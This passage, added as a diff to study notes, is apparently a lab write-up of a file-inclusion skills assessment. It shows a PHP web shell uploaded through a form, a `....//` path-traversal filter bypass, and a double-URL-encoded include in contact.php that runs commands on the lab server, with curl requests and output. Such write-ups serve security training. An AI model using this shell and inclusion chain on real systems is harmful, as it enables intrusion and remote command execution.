@@ -109,3 +109,74 @@ etc
 home
 <...SNIP...>
 ```
+
+### Skills Assessment - File Inclusion
+First thing by looking at the pages of the website only Apply seems to be interesting with it i can upload file and if it is not sanitized properly can lead to RCE.
+![[Screenshot_20260127_120815.png]]
+
+After submitting the form with payload `<?php system($_GET["cmd"]); ?>` was redirected to another page a found possible attack vector `n=value`
+![[Screenshot_20260127_121456.png]]
+
+Tried different payloads used fuzz for for fuzzing with word lists and did not found something, so i decided to peak in source code of the page and found that images are saved in `/api/image.php?p=value`
+![[Screenshot_20260127_121931.png]]
+tried a couple of difference payloads and found that it has none recursive removal which removes `../` to prevent path travel but which is easily bypassed by doubling it `....//`. I was stack on it for a while but but by looking again but now at `apply.php` source code i found that it uses `/api/application.php`, so I will try to read it and possibly find something interesting.
+```bash
+curl "http://94.237.120.233:53829/api/image.php?p=....//api/application.php"  
+<?php  
+$firstName = $_POST["firstName"];  
+$lastName = $_POST["lastName"];  
+$email = $_POST["email"];  
+$notes = (isset($_POST["notes"])) ? $_POST["notes"] : null;  
+  
+$tmp_name = $_FILES["file"]["tmp_name"];  
+$file_name = $_FILES["file"]["name"];  
+$ext = end((explode(".", $file_name)));  
+$target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;  
+move_uploaded_file($tmp_name, $target_file);  
+  
+header("Location: /thanks.php?n=" . urlencode($firstName));  
+?>
+```
+found that file is saved at  `../uploads/md5 of the file name` , so I tried to find and execute the uploaded file
+```bash
+curl "http://94.237.120.233:53829/api/image.php?p=....//uploads/fc023fcacb27a7ad72d605c4e300b389.php&cmd=ls"  
+<?php system($_GET["cmd"]); ?>
+```
+but was only to able to read its content, so i begin looking in other places. After reading contact.php internally i found:
+```bash
+                   <?php  
+                   $region = "AT";  
+                   $danger = false;  
+  
+                   if (isset($_GET["region"])) {  
+                       if (str_contains($_GET["region"], ".") || str_contains($_GET["region"], "/")) {  
+                           echo "'region' parameter contains invalid character(s)";  
+                           $danger = true;  
+                       } else {  
+                           $region = urldecode($_GET["region"]);  
+                       }  
+                   }  
+  
+                   if (!$danger) {  
+                       include "./regions/" . $region . ".php";  
+                   }  
+                   ?>
+```
+which is showing that contact.php has user input which is exploitable as it decode URL only once. Now I can go to any URL decoder and encode this twice `../uploads/fc023fcacb27a7ad72d605c4e300b389` which will lead to `%252E%252E%252Fuploads%252Ffc023fcacb27a7ad72d605c4e300b389`
+```bash
+url "http://94.237.120.233:53829/contact.php?region=%252E%252E%252Fuploads%252Ffc023fcacb27a7ad72d605c4e300b389&cmd=ls%20/"         
+<html>  
+<...SNIP...> 
+boot  
+dev  
+etc  
+flag_09ebca.txt  
+home  
+lib  
+lib64  
+media  
+mnt  
+<...SNIP...>
+</html>
+```
+now you can successfully crab the flag.
